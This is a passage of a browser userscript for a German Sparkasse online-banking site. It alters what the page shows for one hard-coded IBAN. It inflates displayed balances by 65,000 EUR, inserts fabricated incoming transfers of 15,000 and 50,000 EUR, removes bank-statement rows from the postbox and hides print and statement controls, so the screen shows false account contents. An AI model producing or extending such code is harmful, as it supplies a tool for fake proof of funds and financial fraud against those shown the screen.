    const wrapper = document.createElement('div');
    wrapper.className = 'mkp-card-list';
    wrapper.appendChild(header);
    wrapper.appendChild(newUL);

    // Insert in proper position
    const sections = [...container.children];
    const newTime = parseDateValue(dateGroup);
    let insertBefore = null;

    for (const section of sections) {
      const label = section.querySelector('.groupdate')?.textContent?.trim();
      const time = parseDateValue(label);
      if (time < newTime) {
        insertBefore = section;
        break;
      }
    }

    container.insertBefore(wrapper, insertBefore);
    return newUL;
  };

  const findOrCreateDateGroup = (dateGroup) => {
    return findExistingDateGroupUL(dateGroup) || createNewDateGroup(dateGroup);
  };

  /******************************************************************
   * INSERT LOGIC
   ******************************************************************/
  const insertTransaction = (tx) => {
    if (getCleanIBANFromPage() !== IBAN_CHECK_RAW.replace(/\s+/g, '')) return;
    if (transactionAlreadyExists(tx.details)) return;

    const li = createTransactionElement(tx);
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return;

    if (tx.insertMode === 1) {
      let topUL = container.querySelector('ul.custom-top-insert');
      if (!topUL) {
        topUL = document.createElement('ul');
        topUL.className = 'mkp-card-group custom-top-insert';
        container.insertBefore(topUL, container.firstChild);
      }
      topUL.insertBefore(li, topUL.firstChild);
      log(`✅ Inserted "${tx.title}" at top`);
    } else {
      const targetUL = findOrCreateDateGroup(tx.dateGroup);
      if (!targetUL) return;
      targetUL.insertBefore(li, targetUL.firstChild);
      log(`✅ Inserted "${tx.title}" into group "${tx.dateGroup}"`);
    }

    if (typeof tx.positionOffset === 'number') {
      setTimeout(() => repositionTransaction(li, tx.positionOffset), 0);
    }
  };

  // Open link in new tab
  document.addEventListener('click', (e) => {
    const a = e.target.closest('.custom-link-handler');
    if (a?.dataset.link) {
      e.preventDefault();
      const url = a.dataset.link;
      (typeof GM_openInTab === 'function' ? GM_openInTab : window.open)(url, { active: true });
    }
  });

  /******************************************************************
   * MAIN LOOP
   ******************************************************************/
  setInterval(() => {
    transactions.forEach(insertTransaction);
  }, 200);
}


//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


// UTITLITIES

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
 // === CONFIGURATION ===
const config = {
    // Finanzübersicht
    removeSortButtonBottom: true,

    // Umsätze
    removeUmsaetzeChartFlowButton: true,
    removeUmsaetzeDruckFlyout: false,
    removeUmsaetzeDruckansichtParent: false,
    removeUmsaetzeSucheFlyout: true,
    removeUmsaetzeSayt: true,
    removeUmsaetzeLineChart: true,
    removeUmsaetzeStickyClone: true,
    removeUmsaetzeMultiselectFlyout: true,
    removeUmsaetzeUmsatzDruckenBlock: true, // ✅ NEW

    // Überweisung
    removeUeberweisungSkontoInput: true,
    removeUeberweisungSkontoLine: true,
    removeUeberweisungVoraussichtlicherSaldoParent: true, // ✅ NEW

    // Finanzenübersicht
    removeFinueberDruckansicht: false,
    removeFinueberSortingWaypoint: true,
    removeFinueberInfoCircleButton: true,
    removeFinueberPrognose: true,

    // Kontodetails
    removeKontodetailsKartenVerwalten: true,
    removeKontodetailsLimitVerwalten: false,
    removeKontodetailsKontoauszugParent: true,
    removeKontodetailsAbrechnungsauskunftParent: true,
    removeKontodetailsKontoweckerParent: true,
    removeKontodetailsDruckansichtShadow: true,
};

const CHECK_INTERVAL_MS = 100;

const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host?.shadowRoot || null;
};

const tryRemove = (selector, description, shouldRemove, options = {}) => {
    try {
        let elements = [];
        const root = options.useShadow ? getShadowRoot() : document;

        if (!root) {
            console.warn(`[Sparkasse utilities] Could not find root for "${description}"`);
            return;
        }

        if (options.queryType === 'title') {
            elements = Array.from(root.querySelectorAll(`[title="${selector}"]`));
        } else if (options.queryType === 'id') {
            const el = root.getElementById(selector);
            if (el) elements = [el];
        } else if (options.queryType === 'data') {
            elements = Array.from(root.querySelectorAll(`[data-waypoint-name="${selector}"]`));
        } else {
            elements = Array.from(root.getElementsByClassName(selector));
        }

        if (options.getParent && elements.length > 0) {
            elements = elements.map(el => el.parentElement).filter(Boolean);
        }

        if (elements.length > 0) {
            console.log(`[Sparkasse utilities] Found ${elements.length} element(s) for "${description}"`);
            if (shouldRemove) {
                elements.forEach(el => el.remove());
                console.log(`[Sparkasse utilities] Removed "${description}"`);
            } else {
                console.log(`[Sparkasse utilities] Skipped removal for "${description}" (config = false)`);
            }
        }
    } catch (error) {
        console.error(`[Sparkasse utilities] Error processing "${description}":`, error);
    }
};

const checkElements = () => {
    // Finanzübersicht
    tryRemove(
        'sort-button-bottom mkp-row mkp-justify-content-flex-end',
        'Sort button bottom (Finanzübersicht)',
        config.removeSortButtonBottom
    );

    // Umsätze
    tryRemove(
        'mkp-button mkp-button-tertiary mkp-button-tertiary-m mkp-icon-svg mkp-icon-left mkp-icon-chart-flow-m mkp-text-nowrap',
        'Chart Flow button (Umsätze)',
        config.removeUmsaetzeChartFlowButton
    );

    tryRemove(
        'mkp-button-flyout druck-button has-linklist',
        'Druck button flyout (Umsätze)',
        config.removeUmsaetzeDruckFlyout
    );

    tryRemove(
        'Druckansicht',
        'Parent of "Druckansicht" (Umsätze)',
        config.removeUmsaetzeDruckansichtParent,
        { queryType: 'title', getParent: true }
    );

    tryRemove(
        'umsatzsuchefilter-buttton-flyout',
        'Filter Flyout (Umsätze)',
        config.removeUmsaetzeSucheFlyout
    );

    tryRemove(
        'umsatz-sayt',
        'Umsatz SAYT',
        config.removeUmsaetzeSayt
    );

    tryRemove(
        'saldo-linechart-wrapper',
        'Saldo Line Chart Wrapper',
        config.removeUmsaetzeLineChart
    );

    tryRemove(
        'mkp-observe-sticky-clone-container',
        'Sticky clone container',
        config.removeUmsaetzeStickyClone
    );

    tryRemove(
        'mkp-button-flyout has-valuelist-multiselect',
        'Multiselect Flyout (Umsätze)',
        config.removeUmsaetzeMultiselectFlyout
    );

    tryRemove(
        'bline nbf-umsatzdrucken mkp-layout-padding btext-only',
        'Umsatzdrucken info block (Umsätze)',
        config.removeUmsaetzeUmsatzDruckenBlock
    );

    // Überweisung
    tryRemove(
        'skontoInputLine',
        'Skonto input line (Überweisung)',
        config.removeUeberweisungSkontoInput,
        { queryType: 'id' }
    );

    tryRemove(
        'skontoLine',
        'Skonto line container (Überweisung)',
        config.removeUeberweisungSkontoLine,
        { queryType: 'id' }
    );

    tryRemove(
        'voraussichtlicherSaldo',
        'Parent of voraussichtlicherSaldo (Überweisung)',
        config.removeUeberweisungVoraussichtlicherSaldoParent,
        { getParent: true }
    );

    // ➕ NEW: Überweisung – currency identifier
    if (
        window.location.href.includes("einzelauftrag") ||
        window.location.href.includes("ueberweisung") ||
        window.location.href.includes("uebertrag") ||
        window.location.href.includes("Downloads")
    ) {
        tryRemove(
            'mkp-identifier-currency',
            'Currency identifier (Überweisung)',
            true
        );
    }

    // Finanzenübersicht
    tryRemove(
        'Druckansicht',
        'Druckansicht (Finanzenübersicht)',
        config.removeFinueberDruckansicht,
        { queryType: 'title' }
    );

    tryRemove(
        'tour-sorting-waypoint',
        'Tour Sorting Waypoint',
        config.removeFinueberSortingWaypoint,
        { queryType: 'data' }
    );

    tryRemove(
        'mkp-button mkp-button-tertiary mkp-button-tertiary-m mkp-icon-svg mkp-icon-left mkp-icon-info-circle-s',
        'Info circle button',
        config.removeFinueberInfoCircleButton
    );

    tryRemove(
        'is-prognose',
        'Prognose marker',
        config.removeFinueberPrognose
    );

    // Kontodetails (shadow-aware)
    tryRemove(
        'Karten verwalten',
        'Karten verwalten button',
        config.removeKontodetailsKartenVerwalten,
        { queryType: 'title', useShadow: true }
    );

    tryRemove(
        'Online-Banking-Limit verwalten',
        'Limit verwalten button',
        config.removeKontodetailsLimitVerwalten,
        { queryType: 'title', useShadow: true }
    );

    tryRemove(
        'Kontoauszüge nacherstellen',
        'Parent of Kontoauszüge nacherstellen',
        config.removeKontodetailsKontoauszugParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Zur Abrechnungsauskunft',
        'Parent of Abrechnungsauskunft',
        config.removeKontodetailsAbrechnungsauskunftParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Zum Kontowecker',
        'Parent of Kontowecker',
        config.removeKontodetailsKontoweckerParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Druckansicht',
        'Druckansicht (Kontodetails inside shadow root)',
        config.removeKontodetailsDruckansichtShadow,
        { queryType: 'title', useShadow: true }
    );
};

setInterval(checkElements, CHECK_INTERVAL_MS);

}

 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  /*** Configuration ***/
  // Scan interval (ms)
  const INTERVAL_MS = 200;

  // If false => case-insensitive substring checks
  const CASE_SENSITIVE = false;

//  // Your rule sets: a row is removed if it matches ALL enabled texts in ANY set.
//  const RULES = [
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '8/2025',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
// [
//      { text: 'Kontoauszug', use: true },
//      { text: '9/2025',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
//       [
 //     { text: 'Kontoauszug', use: true },
//      { text: '10/2021',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
//    // Add more rule sets as needed:
//    // [
//    //   { text: 'AnotherWord', use: true },
//    //   { text: 'ExtraWord',   use: false },
//    // ],
//  ];

  /*** Helpers ***/
  const norm = (s) => (CASE_SENSITIVE ? String(s ?? '') : String(s ?? '').toLowerCase());
  const enabledTexts = (set) => set.filter(r => r && r.use && typeof r.text === 'string').map(r => r.text);

  function rowMatchesAnyRuleSet(rowText) {
    const hay = norm(rowText);
    if (!hay) return false;

    for (const set of RULES) {
      const needles = enabledTexts(set).map(norm);
      if (needles.length === 0) continue;

      // Row matches a set if it contains ALL enabled texts in that set
      const allFound = needles.every(word => hay.includes(word));
      if (allFound) return true;
    }
    return false;
  }

  // Get all target rows under elements with class="btableblock mkp-table"
  function getTargetRows() {
    // Covers: <table class="btableblock mkp-table"> ... or any container with those classes
    const containers = document.querySelectorAll('.btableblock.mkp-table');
    const rows = [];
    containers.forEach(c => {
      // prefer tbody > tr, but also catch stray tr
      rows.push(...c.querySelectorAll('tbody > tr, tr'));
    });
    return rows;
  }

  function removeMatchingRowsOnce() {
    try {
      const rows = getTargetRows();
      if (!rows.length) return;

      let removedCount = 0;

      for (const tr of rows) {
        // Skip header rows inside THEAD just in case
        if (tr.closest('thead')) continue;

        const text = tr.textContent || '';
        if (rowMatchesAnyRuleSet(text)) {
          tr.remove();
          removedCount++;
        }
      }

      if (removedCount > 0) {
        console.log(`[spar postfach] Removed ${removedCount} matching row(s).`);
      }
    } catch (err) {
      console.error('[spar postfach] Error while removing rows:', err);
    }
  }

  function startScanner() {
    // Run immediately once DOM is interactive/ready, then every INTERVAL_MS
    removeMatchingRowsOnce();
    setInterval(removeMatchingRowsOnce, INTERVAL_MS);
    console.log('[spar postfach] Scanner started.');
  }

  // Start as early as possible but ensure DOM exists
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startScanner, { once: true });
  } else {
    startScanner();
  }
}


//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

// SECOND ACCOUNT

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

// SECOND ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

// SECOND ACCOUNT
//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

// SECOND ACCOUNT



// UMSATZE BALANCE

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /**
   * Amount (EUR) to add (positive) or subtract (negative) to EVERY matching balance
   * inside the specified account cards WHEN the IBAN check matches.
   */
  const DELTA_EUR = 65000; // ← change this value
  const DELTA_CENTS = Math.round(Number(DELTA_EUR) * 100);

  /**
   * IBAN guard: only modify balances within a card if the digits of the IBAN shown
   * in its ".mkp-identifier-description" match these digits.
   * The HTML may split the IBAN across text and <strong>, so we compare digits-only.
   */
  const IBAN_CHECK_RAW = 'DE30 8605 5592 1090 2225 36';

  const IBAN_CHECK_DIGITS = (IBAN_CHECK_RAW.match(/\d/g) || []).join('');

  // Card containers to look inside
  const CARD_SELECTOR = [
    '.mkp-card.mkp-card-account.mkp-layout-margin.mkp-card-account-link',
    '.mkp-card.mkp-card-bank-account.mkp-card-thinner.mkp-card-clickable'
  ].join(', ');

  // Balance nodes (handle plus/negative/minus and predecimal variant too)
  const BALANCE_SELECTOR = [
    '.balance-decimal.plus',
    '.balance-decimal.negative',
    '.balance-decimal.minus',
    '.balance-predecimal.plus',
    '.balance-predecimal.negative',
    '.balance-predecimal.minus',
  ].join(', ');

  // ─────────── Helpers: parse/format German amounts ───────────
  function extractParts(text) {
    const s = String(text ?? '');
    const m = s.match(/(.*?)([-–—]?\s*[0-9][0-9.,]*)(.*)/);
    if (!m) return { prefix: '', number: s.trim(), suffix: '', found: false };
    return { prefix: m[1], number: m[2].replace(/\s+/g, ''), suffix: m[3], found: true };
  }

  function parseGermanAmountToCents(text) {
    try {
      if (!text) return null;
      const { number } = extractParts(text);
      if (!number) return null;
      let raw = number.replace(/[–—]/g, '-'); // normalize minus variants
      raw = raw.replace(/\./g, '');           // remove thousands sep
      raw = raw.replace(/,/g, '.');           // decimal comma -> dot
      const val = Number(raw);
      if (!Number.isFinite(val)) return null;
      return Math.round(val * 100);
    } catch (e) {
      console.error('[BalanceInjector] parse error', e, { text });
      return null;
    }
  }

  function formatCentsGerman(cents, { keepCents, keepCurrency, origSuffix } = {}) {
    const negative = cents < 0;
    const abs = Math.abs(cents);
    const euros = Math.floor(abs / 100);
    const dec = abs % 100;
    const eurosStr = euros.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const body = keepCents
      ? `${eurosStr},${dec.toString().padStart(2, '0')}`
      : Math.round(abs / 100).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const sign = negative ? '-' : '';
    const suffix = keepCurrency ? (origSuffix || ' EUR') : (origSuffix || '');
    return `${sign}${body}${suffix}`;
  }

  function detectStyle(text) {
    const t = String(text ?? '');
    const { prefix, number, suffix } = extractParts(t);
    const hasComma = /,/.test(number);
    const hasEUR = /\bEUR\b/i.test(suffix) || /\bEUR\b/i.test(prefix);
    return { suffix, hasComma, hasEUR };
  }

  function setClassesForSign(el, cents) {
    try {
      if (!el?.classList) return;
      const isNeg = cents < 0;
      if (isNeg) {
        el.classList.add('negative', 'minus');
        el.classList.remove('plus');
      } else {
        el.classList.add('plus');
        el.classList.remove('negative', 'minus');
      }
    } catch {}
  }

  // ─────────── IBAN checker per card ───────────
  function cardIbanDigits(card) {
    try {
      const idDesc = card.querySelector('.mkp-identifier-description');
      if (!idDesc) return '';
      // Prefer the <p> that contains the IBAN (can be split across text + <strong>)
      // If multiple <p>, join them (defensive).
      const pList = idDesc.querySelectorAll('p');
      let text = '';
      if (pList.length) {
        pList.forEach(p => { text += ' ' + (p.textContent || ''); });
      } else {
        text = idDesc.textContent || '';
      }
      return (text.match(/\d/g) || []).join('');
    } catch (e) {
      console.warn('[BalanceInjector] Failed to read IBAN from card', e, card);
      return '';
    }
  }

  function ibanMatchesCard(card) {
    const digits = cardIbanDigits(card);
    if (!digits) return false;
    const match = digits === IBAN_CHECK_DIGITS;
    // Optional debug
    // console.debug('[BalanceInjector] IBAN check', { cardDigits: digits, expected: IBAN_CHECK_DIGITS, match });
    return match;
  }

  // ─────────── Per-node cache & application ───────────
  function ensureCache(el) {
    if (!el) return false;
    if (!el.dataset.originalBalanceCents) {
      const currentText = el.textContent?.trim() || '';
      const currentCents = parseGermanAmountToCents(currentText);
      if (currentCents === null) return false;

      const style = detectStyle(currentText);
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      el.dataset.balanceInjector = '1';
      // console.debug('[BalanceInjector] Cached', { originalCents: currentCents, modifiedCents: currentCents + DELTA_CENTS });
    }
    return true;
  }

  function rebaseIfExternalChange(el, currentCents) {
    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents !== original && currentCents !== modified) {
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      const style = detectStyle(el.textContent?.trim() || '');
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      // console.info('[BalanceInjector] Rebased on external change', { newOriginal: currentCents });
    }
  }

  function applyIfOriginal(el) {
    const currentText = el.textContent?.trim() || '';
    const currentCents = parseGermanAmountToCents(currentText);
    if (currentCents === null) return;

    rebaseIfExternalChange(el, currentCents);

    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents === original) {
      const keepCents = el.dataset.keepCents === '1';
      const keepCurrency = el.dataset.keepCurrency === '1';
      const origSuffix = el.dataset.origSuffix || '';
      const formatted = formatCentsGerman(modified, { keepCents, keepCurrency, origSuffix });
      el.textContent = formatted;
      setClassesForSign(el, modified);
      try { el.setAttribute('title', formatted); } catch {}
      el.dataset.lastAppliedAt = String(Date.now());
      // console.debug('[BalanceInjector] Applied', { formatted, modified });
    }
  }

  // ─────────── Main loop: only inside target cards & only if IBAN matches ───────────
  function processAll() {
    try {
      const cards = document.querySelectorAll(CARD_SELECTOR);
      if (!cards.length) return;

      cards.forEach((card) => {
        if (!ibanMatchesCard(card)) {
          // Skip this card if IBAN digits don't match the expected one
          return;
        }

        const balances = card.querySelectorAll(BALANCE_SELECTOR);
        balances.forEach((el) => {
          if (!ensureCache(el)) return;
          applyIfOriginal(el);
        });
      });
    } catch (e) {
      console.error('[BalanceInjector] Tick error', e);
    }
  }

  // Run forever at the chosen cadence (interval only)
  processAll(); // immediate pass
  const id = setInterval(processAll, 20);
  window.__BalanceInjectorIntervalId__ = id; // debug handle
  console.log('[BalanceInjector] Started (interval 100ms). Delta per balance:', DELTA_EUR, 'EUR');
}




//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

//. KONTODETAILS NEW 15.12



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG ========= */
  const DELTA_EUR = 65000;
  const IBAN_CHECK_RAW = 'DE30 8605 5592 1090 2225 36';
  /* ========================= */

  const log = (...a) => console.log('[Delta FIX]', ...a);
  const warn = (...a) => console.warn('[Delta FIX]', ...a);
  const err = (...a) => console.error('[Delta FIX]', ...a);

  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  /* ---------- German number helpers ---------- */
  const parseDE = (str) => {
    const cleaned = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(cleaned);
  };

  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [i, d] = abs.toFixed(2).split('.');
    return `${neg}${i.replace(/\B(?=(\d{3})+(?!\d))/g, '.')},${d}`;
  };

  const splitValueAndSuffix = (text) => {
    const m = text.match(/-?[\d.]+,\d{2}/);
    if (!m) return null;
    const suffix = text.slice(m.index + m[0].length).trim();
    return { value: m[0], suffix: suffix ? ' ' + suffix : '' };
  };

  /* ---------- Shadow root ---------- */
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-slot-shadow');
    if (!host) {
      warn('Shadow host not found yet');
      return null;
    }
    if (!host.shadowRoot) {
      warn('Shadow root not attached yet');
      return null;
    }
    return host.shadowRoot;
  };

  /* ---------- IBAN check ---------- */
  const ibanMatches = (root) => {
    const labels = [...root.querySelectorAll('p.MuiTypography-label04')];
    const ibanLabel = labels.find(p => p.textContent.trim() === 'IBAN');

    if (!ibanLabel) {
      warn('IBAN label not found');
      return false;
    }

    const container = ibanLabel.closest('[role="listitem"]');
    if (!container) {
      warn('IBAN container not found');
      return false;
    }

    const valueEl = container.querySelector('p.MuiTypography-input01');
    if (!valueEl) {
      warn('IBAN value element not found');
      return false;
    }

    const rawText = valueEl.textContent;
    const digits = rawText.replace(/\D/g, '');

    log('IBAN raw text:', rawText);
    log('IBAN digits found:', digits);
    log('IBAN expected:', IBAN_DIGITS_EXPECTED);

    const ok = digits === IBAN_DIGITS_EXPECTED;
    if (!ok) warn('IBAN mismatch');
    else log('IBAN match OK');

    return ok;
  };

  /* ---------- Core delta logic ---------- */
  const processed = new WeakSet();

  const applyDeltaForLabel = (labelText) => {
    try {
      const root = getShadowRoot();
      if (!root) return;

      if (!ibanMatches(root)) return;

      const labels = [...root.querySelectorAll('p.MuiTypography-label04')]
        .filter(p => p.textContent.trim().startsWith(labelText));

      if (!labels.length) {
        warn(`Label not found: ${labelText}`);
        return;
      }

      labels.forEach(label => {
        const container = label.closest('[role="listitem"]');
        if (!container) return;

        const valueEl = container.querySelector('p.MuiTypography-input01');
        if (!valueEl) return;

        if (processed.has(valueEl)) return;

        const originalText = valueEl.textContent.trim();
        const split = splitValueAndSuffix(originalText);

        if (!split) {
          warn('Cannot parse number from:', originalText);
          return;
        }

        const originalNum = parseDE(split.value);
        if (isNaN(originalNum)) {
          warn('Parsed NaN from:', originalText);
          return;
        }

        const modified = formatDE(originalNum + DELTA_EUR) + split.suffix;

        log(labelText, 'original:', originalText);
        log(labelText, 'modified:', modified);

        valueEl.textContent = modified;
        processed.add(valueEl);
      });
    } catch (e) {
      err('applyDeltaForLabel error', e);
    }
  };

  /* ---------- Tick ---------- */
  const tick = () => {
    applyDeltaForLabel('Kontostand');
    applyDeltaForLabel('Verfügbarer Betrag');
  };

  log('Delta FIX userscript loaded');
  setInterval(tick, 250);

}


// KONTODETAILS BALANCE  OLD

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG =========
     Positive increases, negative decreases (EUR).
     Examples: 25  |  -10.5  |  1234.56
  */
  const DELTA_EUR = 65000; // <-- set your offset here
//
//  // IBAN digits must match those displayed under `.mkp-identifier-description > p`
  const IBAN_CHECK_RAW = 'DE30 8605 5592 1090 2225 36';
  /* ========================= */

  const log = (...a) => console.log('[Kontodetails mod]', ...a);

  // Labels to modify (beginning of title/aria-label)
  const LABELS = ['Kontostand', 'Verfügbarer Betrag'];

  // --- German number helpers ---
  const parseDE = (str) => {
    if (!str) return NaN;
    const num = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(num);
  };
  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [intPart, decPart] = abs.toFixed(2).split('.');
    const withThousands = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    return `${neg}${withThousands},${decPart}`;
  };
  const splitValueAndSuffix = (text) => {
    const trimmed = text.trim().replace(/\s+/g, ' ');
    const match = trimmed.match(/-?[\d.]+,\d{2}/);
    if (!match) return { valuePart: trimmed, suffix: '' };
    const valuePart = match[0];
    const after = trimmed.slice(match.index + valuePart.length).trimStart();
    const suffix = after.length ? ' ' + after : '';
    return { valuePart, suffix };
  };

  // ---- IBAN check helpers ----
  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  const getIbanDigitsFromPage = () => {
    // Example markup:
    // <div class="mkp-identifier-description">
    //   <p>DE52 2905 0101 00<strong>84 5790 28</strong></p>
    // </div>
    const p = document.querySelector('.mkp-identifier-description p');
    if (!p) return null;
    const txt = p.textContent || '';
    const digits = txt.replace(/\D/g, '');
    return digits || null;
  };

  const ibanMatches = () => {
    const pageDigits = getIbanDigitsFromPage();
    if (!pageDigits) {
      log('IBAN not found on page; skipping this tick.');
      return false;
    }
    const ok = pageDigits === IBAN_DIGITS_EXPECTED;
    if (!ok) log('IBAN mismatch; skipping modification.', { expected: IBAN_DIGITS_EXPECTED, found: pageDigits });
    return ok;
  };

  // Shadow root that holds the balances
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host && host.shadowRoot ? host.shadowRoot : null;
  };

  // Build selector for allowed labels
  const labelSelector = LABELS.map(l => `[title^="${l}"], [aria-label^="${l}"]`).join(', ');

  // Find all value elements we want to control
  const findAllBalanceElements = (root) => {
    if (!root) return [];
    const blocks = root.querySelectorAll(labelSelector);
    const values = [];
    blocks.forEach(block => {
      const el = block.querySelector('.MuiTypography-input01');
      if (el) values.push(el);
    });
    return values;
  };

  // Per-element state
  const stateMap = new WeakMap(); // el -> { originalText, originalNumber, suffix, modifiedText }

  const captureBaseline = (el) => {
    const text = (el.textContent || '').trim();
    const { valuePart, suffix } = splitValueAndSuffix(text);
    const num = parseDE(valuePart);
    if (isNaN(num)) return null;
    const s = {
      originalText: text,
      originalNumber: num,
      suffix,
      modifiedText: formatDE(num + DELTA_EUR) + suffix
    };
    stateMap.set(el, s);
    log('Captured baseline:', s.originalText);
    return s;
  };

  const applyModified = (el, s) => {
    if (!s) return;
    el.textContent = s.modifiedText;
    log('Applied modified balance:', s.modifiedText);
  };

  const tick = () => {
    try {
      // 1) IBAN must match; otherwise skip the entire cycle.
      if (!ibanMatches()) return;

      // 2) Proceed with balances inside the shadow root.
      const root = getShadowRoot();
      if (!root) return;

      const targets = findAllBalanceElements(root);

      for (const el of targets) {
        let s = stateMap.get(el);
        if (!s) {
          s = captureBaseline(el);
          if (!s) continue;
          // First time: apply once.
          applyModified(el, s);
          continue;
        }

        const currentText = (el.textContent || '').trim();

        // Only re-apply when we see the original again.
        if (currentText === s.originalText) {
          applyModified(el, s);
          continue;
        }

        // If bank updated the baseline (neither originalText nor our modifiedText),
        // adopt that as the new baseline, then apply.
        if (currentText !== s.modifiedText) {
          const { valuePart, suffix } = splitValueAndSuffix(currentText);
          const liveNum = parseDE(valuePart);
          if (!isNaN(liveNum) && (liveNum !== s.originalNumber || suffix !== s.suffix)) {
            const newState = {
              originalText: currentText,
              originalNumber: liveNum,
              suffix,
              modifiedText: formatDE(liveNum + DELTA_EUR) + suffix
            };
            stateMap.set(el, newState);
            log('Baseline changed; updated and re-applied:', newState.originalText);
            applyModified(el, newState);
          }
        }
        // If it's already our modified text, do nothing.
      }
    } catch (e) {
      console.error('[Kontodetails mod] tick error:', e);
    }
  };

  // Check every 2 seconds; no MutationObserver
  setInterval(tick, 100);
}



//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


//  TRANSAKTION INSERTION

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
  'use strict';

///  // ✅ CONFIG: IBAN & TRANSACTIONS
  const IBAN_CHECK_RAW = 'DE30 8605 5592 1090 2225 36';

  const transactions = [
    {
      title: "Anna Gold",
      details: "Bitte A. Gold  kontaktieren.",
      amountText: "15.000,00 EUR",
     dateGroup: "22.12.2025",
      insertMode: 2,
      positionOffset: -1,
      link: "https://example.com/tx-1"
    },
       {
      title: "Maria Gold",
      details: " Als Pfand benutzen",
      amountText: "50.000,00 EUR",
     dateGroup: "24.12.2025",  // 24.12.2025
      insertMode: 2,
      positionOffset: -1,
      link: "https://example.com/tx-2"
    },
///    {
 ///     title: "Sylvanne OU",
///      details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
///      amountText: "43.000,00 EUR",
///      dateGroup: "Gestern",
///      insertMode: 2,
///      positionOffset: 0
///    }
  ];

  /******************************************************************
   * HELPERS
   ******************************************************************/
  const log  = (...args) => console.log("[UserScript]", ...args);

  const getAmountHtml = (amountText) => {
    const match = amountText.match(/^([+-]?)([\d.]+),(\d{2})\s*EUR$/i);
    if (!match) return '';
    const [, sign, pre, dec] = match;
    const signClass = sign === '-' ? 'minus' : 'plus';
    return `
    <div class="mkp-identifier-currency">
      <p class="mkp-currency mkp-currency-pill mkp-currency-m">
        <span aria-hidden="true" class="balance-predecimal ${signClass}">${sign}${pre}</span>
        <span aria-hidden="true" class="balance-decimal ${signClass}">,${dec}&nbsp;EUR</span>
        <span aria-hidden="false" class="offscreen">Betrag:${sign}${pre},${dec} EUR</span>
      </p>
    </div>`;
  };

  const createTransactionElement = (tx) => {
    const id = `custom_tx_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
    const amountHtml = getAmountHtml(tx.amountText);
    const html = `
<li data-cloned="true" data-details="${tx.details}">
  <div id="${id}" class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
    <div class="mkp-identifier">
      <div class="mkp-identifier-description">
        <h4 class="mkp-headline-05">
          <a href="#" class="mkp-identifier-link custom-link-handler" data-link="${tx.link || ''}" style="cursor: pointer;">
            ${tx.title}
          </a>
        </h4>
        <p>${tx.details}</p>
      </div>
      <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div>
      ${amountHtml}
    </div>
  </div>
</li>`;
    const wrapper = document.createElement('div');
